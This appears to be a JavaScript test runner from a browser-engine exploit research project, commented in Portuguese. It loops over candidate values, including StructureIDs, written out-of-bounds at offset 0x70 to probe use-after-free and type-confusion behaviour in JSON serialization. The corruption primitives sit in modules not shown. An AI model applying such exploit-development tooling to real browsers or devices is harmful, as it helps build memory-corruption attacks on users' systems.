// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG, KNOWN_STRUCTURE_IDS } from '../config.mjs';
import { toHex } from '../utils.mjs';

async function runUAFTypeConfusion_VaryOOBValue_At_0x70() {
    const FNAME_RUNNER = "runUAFTypeConfusion_VaryOOBValue_At_0x70";
    logS3(`==== INICIANDO Testes UAF/TC: Variando Valor OOB em 0x70 (toJSON Detalhada com DepthCtrl+Slice) ====`, 'test', FNAME_RUNNER);

    const values_to_write_at_0x70 = [
        { desc: "Val_00000000", val: 0x00000000 },
        { desc: "Val_00000001", val: 0x00000001 },
        { desc: "Val_41414141", val: 0x41414141 },
        // Testar novamente 0xFFFFFFFF, pois agora a toJSON é mais estável com controle de profundidade
        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF },
        // Outros valores que podem ser interessantes (ex: limites de inteiros, ponteiros pequenos)
        { desc: "Val_80000000", val: 0x80000000 }, // Negative int max
        { desc: "Val_7FFFFFFF", val: 0x7FFFFFFF }, // Positive int max
        // Adicionar aqui StructureIDs conhecidos se forem numéricos e você os tiver
        // Exemplo: { desc: "StructID_AB", val: parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16) || 0x12345678 },
    ];

    if (KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER && !KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER.includes("FILL_ME_IN")) {
        const sid = parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16);
        if (!isNaN(sid)) {
            values_to_write_at_0x70.push({ desc: `StructID_AB_${toHex(sid)}`, val: sid });
        }
    }
    // Adicione mais IDs de estrutura aqui da mesma forma

    for (const test_case of values_to_write_at_0x70) {
        const testDescription = `VaryVal_OOB_${test_case.desc}_Offset0x70`;
        logS3(`\n--- Executando Teste UAF/TC: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
        
        let result = await executeUAFTypeConfusionTestWithValue(
            testDescription,
            test_case.val // Este é o valor que será escrito no offset 0x70
        );

        if (result.potentiallyFroze) {
            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.errorOccurred) {
            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
            if(result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "warn");
        } else {
            logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
            logS3(`      Stringify Result: ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
    }

    logS3(`==== Testes UAF/TC com Valores OOB Variados em 0x70 CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_UAFTypeConfusion_VaryOOBValue';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes UAF/TC com Valores OOB Variados em 0x70 (toJSON Detalhada com DepthCtrl+Slice) ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - UAF/TC Vary OOB Value @0x70";
    
    await runUAFTypeConfusion_VaryOOBValue_At_0x70();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Testes UAF/TC com Valores OOB Variados em 0x70) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    document.title = "Script 3 Concluído - UAF/TC Vary OOB Value @0x70";
}
